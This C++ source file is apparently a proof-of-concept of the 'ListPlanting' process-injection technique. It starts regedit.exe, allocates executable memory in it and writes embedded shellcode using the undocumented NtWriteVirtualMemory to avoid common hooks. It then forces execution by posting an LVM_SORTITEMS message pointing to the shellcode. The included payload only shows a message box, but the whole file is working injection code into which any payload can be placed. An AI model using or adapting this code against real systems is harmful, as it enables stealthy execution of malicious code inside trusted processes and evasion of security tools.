#define UNICODE
#define _UNICODE

#include <windows.h>
#include <commctrl.h>
#include <iostream>

#pragma comment (lib, "user32.lib")

// Custom system error printing function
void PrintError(const char* text)
{
    DWORD err = GetLastError();
    LPSTR buf = nullptr;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
        FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
        FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
        nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
        err,                                   // dwMessageId: The error code for which we want the message
        0,                                     // dwLanguageId: Use default language
        (LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
        0,                                     // nSize: Size of the buffer; 0 to use the allocated size
        nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

    if (buf) // strip trailing CR/LF
    {
        char* p = buf;
        while (*p && (*p != '\r') && (*p != '\n')) ++p;
        *p = '\0';
    }

    printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
    LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

// We will use Native API NtWriteVirtualMemory, which is not documented
// Define the NtWriteVirtualMemory prototype
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,        // A handle to the process whose memory is to be written
    PVOID BaseAddress,           // A pointer to the base address in the specified process to which to write
    PVOID Buffer,                // A pointer to the buffer that contains the data to be written to the address space of the specified process
    ULONG NumberOfBytesToWrite,  // The number of bytes to be written to the specified process
    PULONG NumberOfBytesWritten  // A pointer to a variable that receives the number of bytes transferred into the specified buffer
);

// Manually define STATUS_SUCCESS
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// Struct to hold data for enumerating windows
struct EnumData {
    LPCWSTR title; // Pointer to a wide-character string representing the window title
    HWND hwnd;     // Handle to the window if found
};

// Check if the window title contains the specified substring
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam; // Cast lParam to EnumData pointer for access
    wchar_t title[256];
    
    // Retrieve the window title
    GetWindowTextW(
        hwnd,    // hWnd: Handle to the window whose title is to be retrieved
        title,   // lpString: Pointer to the buffer that receives the window title
        256      // nMaxCount: Maximum number of characters to copy to the buffer
    );

    // Check if the title contains the specified substring
    if (wcsstr(title, data->title) != NULL) {
        data->hwnd = hwnd;               // Store the handle of the matching window
        return FALSE;                    // Stop enumerating windows
    }
    return TRUE;
}

// Check if the class name of the child window matches the specified title
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;  // Cast lParam to EnumData pointer for access
    wchar_t className[256];

    // Retrieve the class name of the specified child window (hwnd)
    GetClassNameW(
        hwnd,          // hWnd: Handle to the window whose class name is to be retrieved
        className,     // lpClassName: Pointer to the buffer that receives the class name
        256            // nMaxCount: Maximum number of characters to copy to the buffer
    );

    // Compare the retrieved class name with the title in 'data'
    if (wcscmp(className, data->title) == 0) {
        data->hwnd = hwnd;               // Store the handle of the matching child window
        return FALSE;                    // Stop enumerating child windows
    }
    return TRUE;
}

// position-independent shellcode crafted from message.cpp
unsigned char payload[] =
{   
    0x48, 0x83, 0xEC, 0x28, 0x48, 0xB8, 0x72, 0x3A, 0x33, 0x32,
    0x2E, 0x64, 0x6C, 0x6C, 0x50, 0x48, 0x89, 0xE1, 0xFF, 0x15, 
    0x41, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x65, 0x73, 0x73, 
    0x61, 0x67, 0x65, 0x42, 0x50, 0x48, 0xB8, 0x48, 0x65, 0x6C, 
    0x50, 0x72, 0x6F, 0x00, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x48, 
    0x8B, 0x0D, 0x31, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x23, 0x00, 
    0x00, 0x00, 0x4D, 0x31, 0xC9, 0x4C, 0x8D, 0x05, 0x3D, 0x00, 
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x22, 0x00, 0x00, 0x00, 0x48,
    0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x50, 0xC3, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x6A, 0x00, 0x65, 
    0x00, 0x63, 0x00, 0x74, 0x00, 0x65, 0x00, 0x64, 0x00, 0x21, 
    0x00, 0x00, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 
    0x00, 0x50, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x74, 
    0x00, 0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x00, 0x00
};

int main(int argc, char* argv[]) {

    // Structure to specify process creation parameters for CreateProcess
    STARTUPINFO si;
    // Structure to receive process and thread identifiers from CreateProcess
    PROCESS_INFORMATION pi;

    // Initialize the STARTUPINFO structure to zero and set its size
    ZeroMemory(&si, sizeof(si)); // Clears the memory of 'si' to ensure no garbage values
    si.cb = sizeof(si);          // Sets the size of the STARTUPINFO structure 
    ZeroMemory(&pi, sizeof(pi)); // Clears the memory of 'pi' to ensure no garbage values

    // Create a process for the Windows Registry Editor
    if (!CreateProcess(
        L"C:\\Windows\\regedit.exe",   // lpApplicationName: Path to the executable to start (Registry Editor)
        NULL,                           // lpCommandLine: Command line arguments (NULL for default)
        NULL,                           // lpProcessAttributes: Process handle not inheritable
        NULL,                           // lpThreadAttributes: Thread handle not inheritable
        FALSE,                          // bInheritHandles: Set to FALSE to prevent handle inheritance
        0,                              // dwCreationFlags: No creation flags set (default behavior)
        NULL,                           // lpEnvironment: Use parent's environment block
        NULL,                           // lpCurrentDirectory: Use parent's starting directory
        &si,                            // lpStartupInfo: Pointer to STARTUPINFO structure for startup parameters
        &pi                             // lpProcessInformation: Pointer to PROCESS_INFORMATION structure to receive process and thread IDs
    )) {
        PrintError("Failed to create process");
        return -1;
    }

    HANDLE ph;           // Handle to the opened process (will be used for memory operations)
    DWORD pid;           // Variable to store the process ID of the target process
    LPVOID mem;          // Pointer for allocated memory in the target process's address space
    EnumData data;       // Structure instance to hold window title and handle for enumeration purposes

    // Find the "Registry Editor" window
    data.title = L"Registry Editor";  // Set the title to search for in the window enumeration
    data.hwnd = NULL;                 // Initialize hwnd to NULL to store the handle of the found window
    
    // Enumerate top-level windows, passing 'data' for title and hwnd storage
    EnumWindows(
        EnumWindowsProc,              // lpEnumFunc: Pointer to the callback function that processes each enumerated window
        (LPARAM)&data                 // lParam: Pointer to the EnumData structure containing the title and hwnd
    );

    HWND wpw = data.hwnd;             // Retrieve the handle of the found window (if any)
    if (!wpw) {
        PrintError("Failed to find window");
        return 1;
    }

    // Find the "SysListView32" child window
    data.title = L"SysListView32";
    data.hwnd = NULL;

    // Enumerate all child windows of the specified parent window (wpw) and call EnumChildProc for each
    EnumChildWindows(
        wpw,                          // hWndParent: Handle of the parent window whose child windows are to be enumerated
        EnumChildProc,                // lpEnumFunc: Pointer to the callback function that processes each enumerated child window
        (LPARAM)&data                 // lParam: Pointer to the EnumData structure for title and hwnd storage
    ); 
    // Retrieve the handle of the found child window from the EnumData structure
    HWND hw = data.hwnd;
    if (!hw) {
        PrintError("Failed to find list view");
        return 1;
    }

    // Retrieve the process ID associated with the specified window (hw) and stores it in pid
    GetWindowThreadProcessId(
        hw,                           // hWnd: Handle to the window whose process ID is to be retrieved
        &pid                          // lpdwProcessId: Pointer to a variable that receives the process ID of the window
    );
    if (pid == 0) {
        PrintError("Failed to get process ID");
        return 1;
    }

    // Open a handle to the process with all access rights
    ph = OpenProcess(
        PROCESS_ALL_ACCESS,            // dwDesiredAccess: Access rights for the process, allowing all operations
        FALSE,                         // bInheritHandle: Set to FALSE to prevent the handle from being inherited by child processes
        pid                            // dwProcessId: The identifier of the process to open
    );
    if (!ph) {
        PrintError("Failed to open process");
        return 1;
    }

    // Allocate memory in the target process's address space for the payload
    mem = VirtualAllocEx(
        ph,                            // hProcess: Handle to the target process where memory will be allocated
        NULL,                          // lpAddress: NULL to let the system choose the address for the allocation
        sizeof(payload),               // dwSize: Size of the memory block to allocate, equal to the size of the payload
        MEM_RESERVE | MEM_COMMIT,      // flAllocationType: Reserve and commit memory in one call
        PAGE_EXECUTE_READWRITE         // flProtect: Sets the memory region as executable and writable
    );
    if (!mem) {
        PrintError("Failed to allocate memory");
        CloseHandle(ph);               // Close the process handle to clean up
        return 1;
    }

    // Retrieve a handle to the ntdll.dll module, which contains the NtWriteVirtualMemory function
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");   // lpModuleName: Name of the module to obtain the handle for
    if (!ntdll) {
        PrintError("Failed to get handle to ntdll.dll");
        return 1;
    }

    // Retrieve the address of the NtWriteVirtualMemory function from the ntdll.dll module
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(
        ntdll,                        // hModule: Handle to the ntdll.dll module
        "NtWriteVirtualMemory"        // lpProcName: Name of the function to retrieve the address for
    );
    if (!NtWriteVirtualMemory) {
        PrintError("Failed to get address of NtWriteVirtualMemory");
        return 1;
    }

    // Use NtWriteVirtualMemory instead of WriteProcessMemory for writing to the target process's memory
    NTSTATUS status = NtWriteVirtualMemory(
        ph,                            // ProcessHandle: Handle to the target process where memory will be written
        mem,                           // BaseAddress: Pointer to the allocated memory region in the target process
        payload,                       // Buffer: Pointer to the data to be written into the target process's memory
        sizeof(payload),               // NumberOfBytesToWrite: Size of the data to be written
        NULL                           // NumberOfBytesWritten: Pointer to a variable to receive the number of bytes transferred (NULL for no output)
    );
    if (status != STATUS_SUCCESS) {
        PrintError("NtWriteVirtualMemory failed");

        // Free the memory allocated in the target process's address space
        VirtualFreeEx(
            ph,                            // hProcess: Handle to the target process from which memory is to be freed
            mem,                           // lpAddress: Pointer to the memory block to be freed
            0,                             // dwSize: 0 to indicate that the entire region should be freed
            MEM_RELEASE                    // dwFreeType: Release the allocated memory back to the operating system
        );
        CloseHandle(ph);                   // Close the process handle to clean up
        return 1;
    }

    // Check if the child window (list view) was successfully found
    if (!hw) {
        PrintError("Failed to find list view");
        return 1;
    }

    // Check if there is at least one item in the list
    // This is relevant in case of other remote process as target
    int itemCount = ListView_GetItemCount(hw);
    if (itemCount <= 0) {
        PrintError("The list view is empty");
        return 1;
    }

    // Trigger the payload execution by posting a message to the list view
    if (!PostMessage(
        hw,                          // hWnd: Handle to the list view window to which the message is sent
        LVM_SORTITEMS,               // Msg: Message identifier for sorting the items in the list view
        0,                           // wParam: Typically used for additional information; unused here (set to 0)
        (LPARAM)mem                  // lParam: Pointer to the payload (memory address in the target process)
    )) {
        PrintError("Failed to post message");

        // Free the allocated memory in the target process's address space after executing the payload
        VirtualFreeEx(
            ph,                       // hProcess: Handle to the target process where memory will be freed
            mem,                      // lpAddress: Pointer to the memory block to be freed
            0,                        // dwSize: 0 to indicate that the entire region should be freed
            MEM_RELEASE               // dwFreeType: Indicates the allocated memory should be released back to the operating system
        );
        CloseHandle(ph);              // Close the process handle to clean up
        return 1;
    }

    // Attempt to terminate the Regedit process gracefully
    if (!TerminateProcess(
        pi.hProcess,                   // hProcess: Handle to the process to be terminated
        0                              // uExitCode: Exit code for the process (0 indicates normal termination)
    )) {
        PrintError("Failed to terminate process");
    }
    else {
        printf("RegEdit process termination successful\n");
    }

    // Wait for the process to exit completely
    WaitForSingleObject(
        pi.hProcess,                  // hHandle: Handle to the process to wait for
        INFINITE                      // dwMilliseconds: Wait indefinitely until the process exits
    );

    // Free the allocated memory in the target process
    VirtualFreeEx(
        ph,                            // hProcess: Handle to the target process where memory will be freed
        mem,                           // lpAddress: Pointer to the memory block to be freed
        0,                             // dwSize: 0 to indicate that the entire memory region should be freed
        MEM_RELEASE                    // dwFreeType: Indicates that the allocated memory should be released back to the operating system
    );

    CloseHandle(ph);                   // Close the handle to the opened process
    CloseHandle(pi.hProcess);          // Close the handle to the process
    CloseHandle(pi.hThread);           // Close the handle to the primary thread

    printf("Payload executed successfully");

    return 0;
}